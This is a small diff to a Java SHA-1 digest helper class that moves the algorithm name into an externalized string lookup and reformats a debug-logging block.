@@ -12,6 +12,7 @@ package com.android.service.crypto;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
@@ -30,10 +31,12 @@ public class SHA1Digest {
 	public SHA1Digest() {
 
 		try {
-			digest = MessageDigest.getInstance("SHA-1");
+			digest = MessageDigest.getInstance(Messages.getString("21.0")); //$NON-NLS-1$
 		} catch (final NoSuchAlgorithmException e) {
 
-			if(Cfg.DEBUG) { Check.log(e); }
+			if (Cfg.DEBUG) {
+				Check.log(e) ;//$NON-NLS-1$
+			}
 		}
 
 	}
